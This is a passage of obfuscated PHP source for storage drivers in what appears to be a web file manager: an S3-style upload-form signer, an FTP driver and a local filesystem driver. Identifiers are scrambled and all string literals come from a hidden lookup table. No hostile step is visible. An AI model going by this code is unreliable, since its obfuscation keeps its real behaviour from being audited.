æ›[1665]]) / $ËÙúëŒ•[$Ü¿ æ›[1665]]; } } public function copyFileStart($Ë…‘‡´Ï, $ôÁÛºÍ, $Õ©İÔ½ç, $«ÓÄ›é¡, $µ¥Â›Ï–, $¼Ç¯±Ä) { $ò©Ô”°Õ =& $_SERVER[­á Ş³Ö]; parent::copyFileStart($Ë…‘‡´Ï, $ôÁÛºÍ, $Õ©İÔ½ç, $«ÓÄ›é¡, $µ¥Â›Ï–, $¼Ç¯±Ä); $ÅœòÆ’è =& $this->task; if ($ÅœòÆ’è[$ò©Ô”°Õ[1776]] == $ò©Ô”°Õ[313]) { $ÅœòÆ’è[$ò©Ô”°Õ[1776]] = $ò©Ô”°Õ[107]; } $this->update(); } public function copyFileEnd($«’Ÿ†İŸ, $—µ‡Ú˜, $±™§åÑî, $›ğÈÍ, $ôäÙ¦½, $Íƒì²çÕ) { $™Æ¯Ö»Â =& $_SERVER[­á Ş³Ö]; $°‘Š‚âé =& $this->task; $°‘Š‚âé[$™Æ¯Ö»Â[1717]] = $°‘Š‚âé[$™Æ¯Ö»Â[1716]]; $°‘Š‚âé[$™Æ¯Ö»Â[1721]] += $°‘Š‚âé[$™Æ¯Ö»Â[1716]]; $°‘Š‚âé[$™Æ¯Ö»Â[1718]] = $™Æ¯Ö»Â[12]; $this->update(); } public function nameParse($Êè¥ø‰) { $¨¡¯è¸ =& $_SERVER[­á Ş³Ö]; $´Œê¤¨« =& $this->task; if ($´Œê¤¨«[$¨¡¯è¸[1664]] < $´Œê¤¨«[$¨¡¯è¸[783]]) { $½ğ±ğŞ = get_path_this($Êè¥ø‰); if (strstr($½ğ±ğŞ, $¨¡¯è¸[10])) { $´Œê¤¨«[$¨¡¯è¸[1664]] += 1; } } if ($´Œê¤¨«[$¨¡¯è¸[1776]] == $¨¡¯è¸[1190]) { $´Œê¤¨«[$¨¡¯è¸[1776]] = $¨¡¯è¸[313]; } $´Œê¤¨«[$¨¡¯è¸[1714]] = $Êè¥ø‰; $this->update(); } } goto e´¿°…„Ä; b„ó×¡¡ƒ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ñÖŞçŞ‚) { parent::__construct($ñÖŞçŞ‚); $this->signatureVersion($_SERVER[­á Ş³Ö][216]); } public function uploadFormData($Ò“Á ™Ï, $îœã‹é = 3600) { $Àó–ŞÛô =& $_SERVER[­á Ş³Ö]; $û¯²ïã” = $Àó–ŞÛô[199]; $Úá«–‰ë = $Àó–ŞÛô[1354]; $Í“êÄ‹ = $Àó–ŞÛô[62]; $º²×æà = gmdate($Àó–ŞÛô[1355]); $ÚˆÙÅŞ = gmdate($Àó–ŞÛô[747]); $Æó™œñù = $Àó–ŞÛô[1356]; $Õ›Éıä½ = $îœã‹é . $Àó–ŞÛô[12]; $¼¹¿Â® = $Àó–ŞÛô[1318]; $ Ã—£ûå = array($this->accessKey, $ÚˆÙÅŞ, $this->region, $Í“êÄ‹, $Æó™œñù); $ºâ…ùšã = implode($Àó–ŞÛô[8], $ Ã—£ûå); $úäÒÔî¬ = array($Àó–ŞÛô[1320] => gmdate($Àó–ŞÛô[1319], strtotime($Àó–ŞÛô[1357])), $Àó–ŞÛô[1321] => array(array($Àó–ŞÛô[1323] => $this->bucket), array($Àó–ŞÛô[1322] => $û¯²ïã”), array($Àó–ŞÛô[1324], $Àó–ŞÛô[1325], $Àó–ŞÛô[12]), array($Àó–ŞÛô[1324], $Àó–ŞÛô[1358], $Àó–ŞÛô[12]), array($Àó–ŞÛô[1324], $Àó–ŞÛô[1359], $Àó–ŞÛô[12]), array($Àó–ŞÛô[1326] => $¼¹¿Â®), array($Àó–ŞÛô[1360] => $ºâ…ùšã), array($Àó–ŞÛô[1361] => $Úá«–‰ë), array($Àó–ŞÛô[1362] => $º²×æà), array($Àó–ŞÛô[1363] => $Õ›Éıä½))); $¶ÙüÊœÇ = base64_encode(json_encode($úäÒÔî¬)); $¨üÍ×È = hash_hmac($Àó–ŞÛô[1364], $ÚˆÙÅŞ, $Àó–ŞÛô[1365] . $this->secret, !0); $êïôÇÍ° = hash_hmac($Àó–ŞÛô[1364], $this->region, $¨üÍ×È, !0); $’á¤œËÌ = hash_hmac($Àó–ŞÛô[1364], $Í“êÄ‹, $êïôÇÍ°, !0); $±§«ä‡è = hash_hmac($Àó–ŞÛô[1364], $Æó™œñù, $’á¤œËÌ, !0); $Ó—°ş¿Ş = hash_hmac($Àó–ŞÛô[1364], $¶ÙüÊœÇ, $±§«ä‡è); $Ë“¼‹ãü = array($Àó–ŞÛô[215] => $Àó–ŞÛô[12], $Àó–ŞÛô[1366] => $Àó–ŞÛô[12], $Àó–ŞÛô[1322] => $û¯²ïã”, $Àó–ŞÛô[1326] => $¼¹¿Â®, $Àó–ŞÛô[1330] => $¶ÙüÊœÇ, $Àó–ŞÛô[1367] => $ºâ…ùšã, $Àó–ŞÛô[1368] => $Úá«–‰ë, $Àó–ŞÛô[1369] => $º²×æà, $Àó–ŞÛô[1370] => $Õ›Éıä½, $Àó–ŞÛô[1371] => $Ó—°ş¿Ş, $Àó–ŞÛô[182] => $this->getHost()); return $Ë“¼‹ãü; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($¦‘¢‹Õ) { parent::__construct(); if (count($¦‘¢‹Õ) > 0) { $this->_init($¦‘¢‹Õ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ØÛŞ¶ˆ¸) { $«†ÏõÜı =& $_SERVER[­á Ş³Ö]; global $config; $this->appCharset = $config[$«†ÏõÜı[1372]]; $this->systemCharset = $config[$«†ÏõÜı[1373]]; if (isset($ØÛŞ¶ˆ¸[$«†ÏõÜı[1374]]) && $ØÛŞ¶ˆ¸[$«†ÏõÜı[1374]]) { $this->systemCharset = $ØÛŞ¶ˆ¸[$«†ÏõÜı[1374]]; } } public function iconvApp($İÛ®òŸ) { return $this->iconvTo($İÛ®òŸ, $this->systemCharset, $this->appCharset); } public function iconvSystem($›Ò©ê¼ø) { return $this->iconvTo($›Ò©ê¼ø, $this->appCharset, $this->systemCharset); } public function getPathOuter($ü‘×Ë–ş) { $©¨ş¡¡× =& $_SERVER[­á Ş³Ö]; $îúŸğÉ­ = $this->iconvApp($this->pathBase); $ü‘×Ë–ş = $this->iconvApp($ü‘×Ë–ş); if (substr($îúŸğÉ­, 0, 2) == $©¨ş¡¡×[1375]) { $îúŸğÉ­ = BASIC_PATH . substr($îúŸğÉ­, 2); } if (substr($ü‘×Ë–ş, 0, 2) == $©¨ş¡¡×[1375]) { $ü‘×Ë–ş = BASIC_PATH . substr($ü‘×Ë–ş, 2); } $îúŸğÉ­ = KodIO::clear($îúŸğÉ­); $ü‘×Ë–ş = KodIO::clear($ü‘×Ë–ş); $ü‘×Ë–ş = substr($ü‘×Ë–ş, strlen($îúŸğÉ­)); if (empty($this->pathDriver)) { return $ü‘×Ë–ş; } return $this->pathDriver . $©¨ş¡¡×[8] . ltrim($ü‘×Ë–ş, $©¨ş¡¡×[8]); } private function _init($ƒêŒ¿–‘ = array()) { $Ñ®˜Ô§ =& $_SERVER[­á Ş³Ö]; if (!function_exists($Ñ®˜Ô§[1376])) { throw new Exception(LNG($Ñ®˜Ô§[1377])); } $this->config = $ƒêŒ¿–‘; $this->charsetReset($ƒêŒ¿–‘); foreach ($ƒêŒ¿–‘ as $ë“úÎéÑ => $®ôı§Êü) { if (isset($this->{$ë“úÎéÑ})) { $this->{$ë“úÎéÑ} = $®ôı§Êü; } } return $this->_login($ƒêŒ¿–‘); } private function _login($‰ßíî£°) { $­‚¹ê¼æ =& $_SERVER[­á Ş³Ö]; static $Œø¹¥áÃ = array(); $Ëâ™œò = md5(json_encode($‰ßíî£°)); if (isset($Œø¹¥áÃ[$Ëâ™œò])) { foreach ($Œø¹¥áÃ[$Ëâ™œò] as $¤ÓÈÅüœ => $é¯¹„¯â) { $this->{$¤ÓÈÅüœ} = $é¯¹„¯â; } return !0; } $èœÔè›¥ = parse_url(trim($this->server, $­‚¹ê¼æ[8])); $this->host = $èœÔè›¥[$­‚¹ê¼æ[182]]; $°¡ÖÍê = isset($èœÔè›¥[$­‚¹ê¼æ[181]]) && $èœÔè›¥[$­‚¹ê¼æ[181]] == $­‚¹ê¼æ[1378] ? !0 : !1; $this->scheme = $°¡ÖÍê ? $­‚¹ê¼æ[1379] : $­‚¹ê¼æ[1380]; $this->port = isset($èœÔè›¥[$­‚¹ê¼æ[183]]) ? $èœÔè›¥[$­‚¹ê¼æ[183]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $‘•îò = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $§‹Á™ÜÒ = $this->pasv == $­‚¹ê¼æ[88] ? !0 : !1; @ftp_pasv($this->connect, $§‹Á™ÜÒ); $Œø¹¥áÃ[$Ëâ™œò] = array($­‚¹ê¼æ[1381] => $this->connect, $­‚¹ê¼æ[182] => $this->host, $­‚¹ê¼æ[181] => $this->scheme, $­‚¹ê¼æ[183] => $this->port); return $‘•îò; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($ãÃÃøò€, $ç•‰÷« = '', $–‘±âëÕ = REPEAT_RENAME) { if ($this->setContent($ãÃÃøò€, $ç•‰÷«)) { return $this->getPathOuter($ãÃÃøò€); } return !1; } public function mkdir($õé’Á‰, $íİƒËŒÜ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $õé’Á‰ = $this->iconvSystem($õé’Á‰); if ($this->_isFolder($õé’Á‰) || @ftp_mkdir($this->connect, $õé’Á‰)) { return $this->getPathOuter($õé’Á‰); } if (!$this->mkdir($this->pathFather($õé’Á‰))) { return !1; } if ($õé’Á‰ = @ftp_mkdir($this->connect, $õé’Á‰)) { return $this->getPathOuter($õé’Á‰); } return !1; } public function copyFile($¶£…ù£õ, $·©ÄÂ×ê) { if (!$this->_isconn()) { return !1; } $ûñƒÜÕŒ = $this->pathThis($this->iconvSystem($¶£…ù£õ)); $î µùÂ• = $this->tempFile($ûñƒÜÕŒ); $®€ÈÂĞ = $this->iconvApp($î µùÂ•); $this->download($¶£…ù£õ, $®€ÈÂĞ); $¼¶ğİü™ = $this->upload($·©ÄÂ×ê, $®€ÈÂĞ); $this->tempFileRemve($î µùÂ•); return $¼¶ğİü™; } public function moveFile($´öÈ«, $•ƒğ²³) { if (!$this->_isconn()) { return !1; } $´öÈ« = $this->iconvSystem($´öÈ«); $•ƒğ²³ = $this->iconvSystem($•ƒğ²³); $êœÙ˜— = @ftp_rename($this->connect, $´öÈ«, $•ƒğ²³); return $êœÙ˜— ? $this->getPathOuter($•ƒğ²³) : !1; } public function delFile($é‰ª±ÃÔ) { if (!$this->_isconn()) { return !1; } $é‰ª±ÃÔ = $this->iconvSystem($é‰ª±ÃÔ); return @ftp_delete($this->connect, $é‰ª±ÃÔ); } public function delFolder($œªÚÎö—) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $±æ –€ = $±“ïäÒ— = array(); $this->fileList($œªÚÎö—, $±æ –€, $±“ïäÒ—, !0); $this->listItemCache = !0; foreach ($±“ïäÒ— as $µˆ‰»ä) { $»Ìè•À = $this->iconvSystem($µˆ‰»ä[$_SERVER[­á Ş³Ö][32]]); $¹¥Ş‚üà = @ftp_delete($this->connect, $»Ìè•À); if (!$¹¥Ş‚üà) { return !1; } } foreach ($±æ –€ as $»Ìè•À) { $»Ìè•À = $this->iconvSystem($»Ìè•À); $¹¥Ş‚üà = @ftp_rmdir($this->connect, $»Ìè•À); if (!$¹¥Ş‚üà) { return !1; } } $œªÚÎö— = $this->iconvSystem($œªÚÎö—); return @ftp_rmdir($this->connect, $œªÚÎö—); } public function rename($ÍŸ‘—ş½, $ˆ¥Ù†Õ”) { $Æä‡Í‚ =& $_SERVER[­á Ş³Ö]; if (!$this->_isconn()) { return !1; } $ôûœ£†‰ = $this->fileNameAuto($this->pathFather($ÍŸ‘—ş½), $ˆ¥Ù†Õ”); $ôûœ£†‰ = $this->iconvSystem($ôûœ£†‰); $ÍŸ‘—ş½ = $this->iconvSystem($ÍŸ‘—ş½); $¥õŒæ‚­ = $this->pathFather($ÍŸ‘—ş½); $ù‘òÍğ… = rtrim($¥õŒæ‚­, $Æä‡Í‚[8]) . $Æä‡Í‚[8] . $ôûœ£†‰; $û™Éù = @ftp_rename($this->connect, $ÍŸ‘—ş½, $ù‘òÍğ…); $ù‘òÍğ… = $this->iconvApp($ù‘òÍğ…); return $û™Éù ? $this->getPathOuter($ù‘òÍğ…) : !1; } private function folderInfo($Ñ¤›¯, $Úè¨®™ì = false) { $¥…µºƒ =& $_SERVER[­á Ş³Ö]; $Ò‹ÓÒÔ = array($¥…µºƒ[32] => $this->pathThis($Ñ¤›¯), $¥…µºƒ[84] => $this->getPathOuter($¥…µºƒ[8] . $Ñ¤›¯), $¥…µºƒ[33] => $¥…µºƒ[75]); if ($Úè¨®™ì) { return $Ò‹ÓÒÔ; } $Ò‹ÓÒÔ[$¥…µºƒ[201]] = $Ò‹ÓÒÔ[$¥…µºƒ[85]] = 0; $Ò‹ÓÒÔ[$¥…µºƒ[202]] = $Ò‹ÓÒÔ[$¥…µºƒ[203]] = !0; return $Ò‹ÓÒÔ; } private function fileInfo($Øí‹Õš», $èŞÖ±éø = false, $ş£‚ü»ª = array()) { $é¹Àø’ı =& $_SERVER[­á Ş³Ö]; $—§×Ì‚ = array($é¹Àø’ı[32] => $this->pathThis($Øí‹Õš»), $é¹Àø’ı[84] => $this->getPathOuter($é¹Àø’ı[8] . $Øí‹Õš»), $é¹Àø’ı[33] => $é¹Àø’ı[200], $é¹Àø’ı[76] => isset($ş£‚ü»ª[$é¹Àø’ı[76]]) ? $ş£‚ü»ª[$é¹Àø’ı[76]] : 0, $é¹Àø’ı[174] => $this->ext($Øí‹Õš»)); if ($èŞÖ±éø) { return $—§×Ì‚; } $—§×Ì‚[$é¹Àø’ı[201]] = $—§×Ì‚[$é¹Àø’ı[85]] = 0; $—§×Ì‚[$é¹Àø’ı[202]] = $—§×Ì‚[$é¹Àø’ı[203]] = !0; $ğú‹–‰Ş = $this->iconvSystem($Øí‹Õš»); $—§×Ì‚[$é¹Àø’ı[85]] = @ftp_mdtm($this->connect, $ğú‹–‰Ş); if (empty($ş£‚ü»ª)) { $ş£‚ü»ª = $this->objectMeta($Øí‹Õš»); if (!$ş£‚ü»ª) { return $—§×Ì‚; } } $—§×Ì‚[$é¹Àø’ı[76]] = $ş£‚ü»ª[$é¹Àø’ı[76]]; return $—§×Ì‚; } public function size($‡—É¿áí) { $‚á¹•Ä¨ = $this->objectMeta($‡—É¿áí); return $‚á¹•Ä¨ ? $‚á¹•Ä¨[$_SERVER[­á Ş³Ö][76]] : 0; } public function info($œ±ò©ö³) { if ($this->isFile($œ±ò©ö³)) { return $this->fileInfo($œ±ò©ö³, 0); } else { if ($this->isFolder($œ±ò©ö³)) { return $this->folderInfo($œ±ò©ö³); } } return !1; } private function fileList($Ó·ò³ËÄ, &$¨û±åœÛ, &$™ƒÓâ„€, $ˆ÷òÇø = false) { $µœÖ•Ç =& $_SERVER[­á Ş³Ö]; $Ó·ò³ËÄ = $this->iconvSystem($Ó·ò³ËÄ); if (!$this->isFolder($Ó·ò³ËÄ)) { return !1; } @ftp_chdir($this->connect, $µœÖ•Ç[8]); $Ó·ò³ËÄ = rtrim($Ó·ò³ËÄ, $µœÖ•Ç[8]) . $µœÖ•Ç[8]; check_abort(); $àú‡„ŠÁ = @ftp_rawlist($this->connect, $Ó·ò³ËÄ); if (!$àú‡„ŠÁ) { $àú‡„ŠÁ = array(); } $ôáêéëØ = array($µœÖ•Ç[10] => 1, $µœÖ•Ç[1382] => 1); foreach ($àú‡„ŠÁ as $Â Ô¹‰ü) { $„‰£Ûôä = $this->_listItem($Â Ô¹‰ü); if ($„‰£Ûôä[0] == $µœÖ•Ç[755]) { continue; } $¸Å˜–ÉÏ = $„‰£Ûôä[8]; if (empty($¸Å˜–ÉÏ) && $¸Å˜–ÉÏ !== $µœÖ•Ç[198] || isset($ôáêéëØ[$¸Å˜–ÉÏ])) { continue; } $¸Å˜–ÉÏ = $this->iconvApp($Ó·ò³ËÄ . ltrim($¸Å˜–ÉÏ, $µœÖ•Ç[8])); $ÙçÓ¬ŸÜ = array($µœÖ•Ç[32] => $¸Å˜–ÉÏ, $µœÖ•Ç[33] => $µœÖ•Ç[200], $µœÖ•Ç[76] => $„‰£Ûôä[4]); if (substr($Â Ô¹‰ü, 0, 1) == $µœÖ•Ç[1383]) { $ÙçÓ¬ŸÜ[$µœÖ•Ç[33]] = $µœÖ•Ç[75]; $ÙçÓ¬ŸÜ[$µœÖ•Ç[76]] = 0; } $›¦†•îÂ = $ÙçÓ¬ŸÜ[$µœÖ•Ç[33]] == $µœÖ•Ç[75] ? !0 : !1; $this->cacheMethodInfoSet($¸Å˜–ÉÏ, $›¦†•îÂ, $ÙçÓ¬ŸÜ); if ($›¦†•îÂ) { $¨û±åœÛ[] = $¸Å˜–ÉÏ; if ($ˆ÷òÇø) { $this->fileList($¸Å˜–ÉÏ, $¨û±åœÛ, $™ƒÓâ„€, $ˆ÷òÇø); } continue; } $™ƒÓâ„€[] = $ÙçÓ¬ŸÜ; } $this->cacheMethodInfoSet($Ó·ò³ËÄ, !0); } private function _listItem($¦ñÈ½ª¤) { if (empty($¦ñÈ½ª¤)) { return array(); } $—§Š…¶ = preg_split($_SERVER[­á Ş³Ö][1384], $¦ñÈ½ª¤); if (count($—§Š…¶) <= 9) { return $—§Š…¶; } $—§Š…¶[8] = trim(substr($¦ñÈ½ª¤, strpos($¦ñÈ½ª¤, $—§Š…¶[7]) + strlen($—§Š…¶[7]))); return array_splice($—§Š…¶, 0, 9); } public function listPath($Àƒ¾İ¶, $…ô‘é–Ö = false) { $öÂ¿Ìûß =& $_SERVER[­á Ş³Ö]; if (!$this->_isconn()) { return !1; } $êÊÎ¼ÄÜ = $íÇ¬À³ì = array(); $this->fileList($Àƒ¾İ¶, $êÊÎ¼ÄÜ, $íÇ¬À³ì); foreach ($êÊÎ¼ÄÜ as $‰ëÑŠÚ => $²ÚƒğØ‹) { $êÊÎ¼ÄÜ[$‰ëÑŠÚ] = $this->folderInfo($²ÚƒğØ‹, $…ô‘é–Ö); } foreach ($íÇ¬À³ì as $‰ëÑŠÚ => $²ÚƒğØ‹) { $íÇ¬À³ì[$‰ëÑŠÚ] = $this->fileInfo($²ÚƒğØ‹[$öÂ¿Ìûß[32]], $…ô‘é–Ö, $²ÚƒğØ‹); } return array($öÂ¿Ìûß[82] => $êÊÎ¼ÄÜ, $öÂ¿Ìûß[83] => $íÇ¬À³ì); } public function has($ÚœÌâ¡º, $ô­ıÓâË = false, $§ùş¸€ = true) { $é®†ş‘ø =& $_SERVER[­á Ş³Ö]; $†ØšåŞù = $Ë“ û‹ı = array(); $ŠŒ¸®ÑÆ = $ô­ıÓâË ? !0 : !1; $this->fileList($ÚœÌâ¡º, $†ØšåŞù, $Ë“ û‹ı, $ŠŒ¸®ÑÆ); if ($ô­ıÓâË) { return array($é®†ş‘ø[207] => count($Ë“ û‹ı), $é®†ş‘ø[208] => count($†ØšåŞù)); } if ($§ùş¸€) { if (count($Ë“ û‹ı)) { return !0; } } else { if (count($†ØšåŞù)) { return !0; } } return !1; } public function listAll($¾’÷Ë†ß) { $Ğ—«íï =& $_SERVER[­á Ş³Ö]; if (!$this->_isconn()) { return !1; } $åÁäµÀö = $Ú­¥Õ‚ = array(); $this->fileList($¾’÷Ë†ß, $åÁäµÀö, $Ú­¥Õ‚, !0); $ÔÑŠªØ = array_to_keyvalue($Ú­¥Õ‚, $Ğ—«íï[32]); foreach ($åÁäµÀö as $ÍÍŒ‰œÛ) { if (is_string($ÍÍŒ‰œÛ)) { $ÔÑŠªØ[$ÍÍŒ‰œÛ] = array($Ğ—«íï[76] => 0); } } return $this->listAllFiles($¾’÷Ë†ß, $ÔÑŠªØ); } public function getContent($¹ÀæûÎŸ) { if (!$this->_isconn()) { return !1; } $¹ÀæûÎŸ = $this->iconvSystem($¹ÀæûÎŸ); return $this->fileSubstr($¹ÀæûÎŸ); } public function setContent($°‘´µÈ”, $‚Šô¬Ó’ = '') { if (!$this->_isconn()) { return !1; } $ÏÙ¶Úòö = $this->pathThis($this->iconvSystem($°‘´µÈ”)); $ÂêªÎë¾ = $this->tempFile($ÏÙ¶Úòö); file_put_contents($ÂêªÎë¾, $‚Šô¬Ó’); $×‘ĞÎÊÁ = $this->upload($°‘´µÈ”, $this->iconvApp($ÂêªÎë¾)); $this->tempFileRemve($ÂêªÎë¾); return $×‘ĞÎÊÁ; } public function fileSubstr($ßõŒÀÄß, $´€ƒÃÔ = 0, $ˆÓª—ƒ» = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ßõŒÀÄß, $´€ƒÃÔ, $ˆÓª—ƒ»); } private function ftpRequest($ÒÙ²ˆ±, $âÂ‚¢«‰ = 0, $í²À¡ÍŠ = false) { $ÒÙ²ˆ± = $this->iconvSystem($ÒÙ²ˆ±); $Îñ¨æ–Ù = $this->scheme . $this->host . $_SERVER[­á Ş³Ö][4] . $this->port; $¨™¡Ö€ = curl_init(); curl_setopt($¨™¡Ö€, CURLOPT_URL, $Îñ¨æ–Ù . $this->pathEncode($ÒÙ²ˆ±)); curl_setopt($¨™¡Ö€, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($í²À¡ÍŠ) { $Â‹Ú«é  = $âÂ‚¢«‰ + $í²À¡ÍŠ - 1; curl_setopt($¨™¡Ö€, CURLOPT_RANGE, "{$âÂ‚¢«‰}\x2d{$Â‹Ú«é }"); } curl_setopt($¨™¡Ö€, CURLOPT_RETURNTRANSFER, 1); $À¶ÅÃ¡© = curl_exec($¨™¡Ö€); curl_close($¨™¡Ö€); return $À¶ÅÃ¡©; } public function upload($×ƒ¥à°Å, $ÂåşÔö, $Ò¨¥ÄßÇ = false, $ãˆË·üò = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($×ƒ¥à°Å))) { return !1; } $×ƒ¥à°Å = $this->iconvSystem($×ƒ¥à°Å); $ÂåşÔö = $this->iconvSystem($ÂåşÔö); $€îî÷Â¯ = ftp_nb_put($this->connect, $×ƒ¥à°Å, $ÂåşÔö, FTP_BINARY); while ($€îî÷Â¯ == FTP_MOREDATA) { $€îî÷Â¯ = ftp_nb_continue($this->connect); } if ($€îî÷Â¯ != FTP_FINISHED) { return !1; } return $this->getPathOuter($×ƒ¥à°Å); } public function download($ÅÑ»ıÛ¾, $„’¤Ôº¸ = '') { if (!$this->_isconn()) { return !1; } $±Î–¬ü² = $this->pathFather($„’¤Ôº¸); if (!IO::mkdir($±Î–¬ü²)) { return !1; } $ÅÑ»ıÛ¾ = $this->iconvSystem($ÅÑ»ıÛ¾); $„’¤Ôº¸ = $this->iconvSystem($„’¤Ôº¸); $Èî‘¥´Å = ftp_nb_get($this->connect, $„’¤Ôº¸, $ÅÑ»ıÛ¾, FTP_BINARY); while ($Èî‘¥´Å == FTP_MOREDATA) { $Èî‘¥´Å = ftp_nb_continue($this->connect); } if ($Èî‘¥´Å != FTP_FINISHED) { return !1; } return $this->iconvApp($„’¤Ôº¸); } public function exist($ºé‡÷) { return $this->isFile($ºé‡÷) || $this->isFolder($ºé‡÷); } public function isFile($×«÷à‹ä) { return !$this->isFolder($×«÷à‹ä) && $this->objectMeta($×«÷à‹ä); } public function isFolder($îìóŞŞ) { return $this->cacheMethod($_SERVER[­á Ş³Ö][165], $îìóŞŞ); } protected function objectMeta($šŞ¢×¯¡) { return $this->cacheMethod($_SERVER[­á Ş³Ö][167], $šŞ¢×¯¡); } protected function _objectMeta($ŠÈêÇ) { $±ô©ŒÓ£ =& $_SERVER[­á Ş³Ö]; if ($ŠÈêÇ == $±ô©ŒÓ£[12] || $ŠÈêÇ == $±ô©ŒÓ£[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ŠÈêÇ = $this->iconvSystem($ŠÈêÇ); $ƒ“”œşĞ = array($±ô©ŒÓ£[32] => $this->iconvApp($ŠÈêÇ), $±ô©ŒÓ£[33] => $±ô©ŒÓ£[200], $±ô©ŒÓ£[76] => 0); @ftp_chdir($this->connect, $±ô©ŒÓ£[8]); $•¢æŒ¼Ñ = @ftp_size($this->connect, $ŠÈêÇ); if ($•¢æŒ¼Ñ != -1) { $ƒ“”œşĞ[$±ô©ŒÓ£[76]] = $•¢æŒ¼Ñ; } else { $ù¡äØ² = @ftp_chdir($this->connect, $ŠÈêÇ); if (!$ù¡äØ²) { return !1; } $ƒ“”œşĞ[$±ô©ŒÓ£[33]] = $±ô©ŒÓ£[75]; } return $ƒ“”œşĞ; } protected function _isFolder($ŞáÖ§Îò) { $™–Õ¯˜§ =& $_SERVER[­á Ş³Ö]; if ($ŞáÖ§Îò == $™–Õ¯˜§[12] || $ŞáÖ§Îò == $™–Õ¯˜§[8]) { return !0; } $÷¸×úÂ¥ = $this->_objectMeta($ŞáÖ§Îò); return isset($÷¸×úÂ¥[$™–Õ¯˜§[33]]) && $÷¸×úÂ¥[$™–Õ¯˜§[33]] == $™–Õ¯˜§[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($£ã÷ù’ş) { if (substr($£ã÷ù’ş, 0, 2) == $_SERVER[­á Ş³Ö][1375]) { $£ã÷ù’ş = BASIC_PATH . substr($£ã÷ù’ş, 2); } return $£ã÷ù’ş; } public function iconvApp($šê‚ùÊ®) { $®¾¡ğöÓ =& $_SERVER[­á Ş³Ö]; global $config; return $this->iconvTo($šê‚ùÊ®, $config[$®¾¡ğöÓ[1373]], $config[$®¾¡ğöÓ[1372]]); } public function iconvSystem($“Åğ´‡Å) { $‹ëò±¸± =& $_SERVER[­á Ş³Ö]; global $config; return $this->iconvTo($“Åğ´‡Å, $config[$‹ëò±¸±[1372]], $config[$‹ëò±¸±[1373]]); } public function getPathOuter($ÔÌ³’µ•) { $˜ ÁÙ°¥ =& $_SERVER[­á Ş³Ö]; $ØÆµ ò = $this->iconvApp($this->pathBase); $ÔÌ³’µ• = $this->iconvApp($ÔÌ³’µ•); if (substr($ØÆµ ò, 0, 2) == $˜ ÁÙ°¥[1375]) { $ØÆµ ò = BASIC_PATH . substr($ØÆµ ò, 2); } if (substr($ÔÌ³’µ•, 0, 2) == $˜ ÁÙ°¥[1375]) { $ÔÌ³’µ• = BASIC_PATH . substr($ÔÌ³’µ•, 2); } $ØÆµ ò = KodIO::clear($ØÆµ ò); $ÔÌ³’µ• = KodIO::clear($ÔÌ³’µ•); $ÔÌ³’µ• = substr($ÔÌ³’µ•, strlen($ØÆµ ò)); if (empty($this->pathDriver)) { return $ÔÌ³’µ•; } return $this->pathDriver . $˜ ÁÙ°¥[8] . ltrim($ÔÌ³’µ•, $˜ ÁÙ°¥[8]); } public function mkfile($Ñ¢İÖš», $ğãÅ¹ü» = '', $í¾˜„í = REPEAT_RENAME) { $Ñ¢İÖš» = $this->iconvSystem($Ñ¢İÖš»); @touch($Ñ¢İÖš»); if ($ğãÅ¹ü») { file_put_contents($Ñ¢İÖš», $ğãÅ¹ü»); } @chmod($Ñ¢İÖš», $this->pathAuth); return is_file($Ñ¢İÖš») ? $this->getPathOuter($Ñ¢İÖš») : !1; } public function mkdir($¬‡¶¬Š, $ÎÏÏàµ­ = REPEAT_SKIP) { $¬‡¶¬Š = $this->iconvSystem($¬‡¶¬Š); if (is_dir($¬‡¶¬Š)) { return $this->getPathOuter($¬‡¶¬Š); } @mkdir($¬‡¶¬Š, $this->pathAuth, !0); @chmod($¬‡¶¬Š, $this->pathAuth); return is_dir($¬‡¶¬Š) ? $this->getPathOuter($¬‡¶¬Š) : !1; } public function copyFile($¤Åã‘é, $ŒÓìš“ô) { $this->mkdir($this->pathFather($ŒÓìš“ô)); $¤Åã‘é = $this->iconvSystem($¤Åã‘é); $ŒÓìš“ô = $this->iconvSystem($ŒÓìš“ô); $—´àæ¹¸ = copy_64($¤Åã‘é, $ŒÓìš“ô); @chmod($ŒÓìš“ô, $this->pathAuth); return $—´àæ¹¸ ? $this->getPathOuter($ŒÓìš“ô) : !1; } public function moveFile($ùèâ¼™, $£äÂıô”) { $this->mkdir($this->pathFather($£äÂıô”)); $ùèâ¼™ = $this->iconvSystem($ùèâ¼™); $£äÂıô” = $this->iconvSystem($£äÂıô”); $ˆÈÚ²İ¹ = intval(@rename($ùèâ¼™, $£äÂıô”)); if (!$ˆÈÚ²İ¹) { if ($ˆÈÚ²İ¹ = intval(@copy_64($ùèâ¼™, $£äÂıô”))) { @unlink($ùèâ¼™); } } @chmod($£äÂıô”, $this->pathAuth); return $ˆÈÚ²İ¹ ? $this->getPathOuter($£äÂıô”) : !1; } public function movePath($Ñö«Æº­, $–¡ìÄÌÑ, $üÍÃ´ªÓ = false) { $ÕÊªä×ä =& $_SERVER[­á Ş³Ö]; $Ñö«Æº­ = $this->iconvSystem($Ñö«Æº­); $–¡ìÄÌÑ = $this->iconvSystem($–¡ìÄÌÑ); $ßü‹Æ ƒ = rtrim($–¡ìÄÌÑ, $ÕÊªä×ä[8]) . $ÕÊªä×ä[8] . ($üÍÃ´ªÓ ? $üÍÃ´ªÓ : get_path_this($Ñö«Æº­)); if (file_exists($ßü‹Æ ƒ)) { return !1; } $©‡Ù§»Æ = intval(@rename($Ñö«Æº­, $ßü‹Æ 